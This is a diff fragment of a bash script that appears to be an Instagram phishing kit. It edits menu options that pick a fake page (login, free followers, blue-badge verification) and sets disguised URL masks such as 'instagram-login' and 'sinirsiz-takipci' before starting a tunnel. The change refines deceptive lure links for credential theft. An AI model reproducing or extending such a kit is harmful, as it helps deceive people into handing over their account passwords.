@@ -1,3 +1,4 @@
+  
 #!/bin/bash
 
 trap 'printf "\n";stop;exit 1' 2
@@ -331,15 +332,15 @@ read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: 
 
 if [[ $ig_option == 1 || $ig_option == 01 ]]; then
 website="instagram"
-mask='get-unlimited-followers-for-instagram'
+mask='instagram-login'
 tunnel_menu
 elif [[ $ig_option == 2 || $ig_option == 02 ]]; then
 website="ig_followers"
-mask='get-unlimited-followers-for-instagram'
+mask='sinirsiz-takipci'
 tunnel_menu
 elif [[ $ig_option == 3 || $ig_option == 03 ]]; then
 website="ig_verify"
-mask='blue-badge-verify-for-instagram-free'
+mask='blue-badge-verify'
 tunnel_menu
 
 else
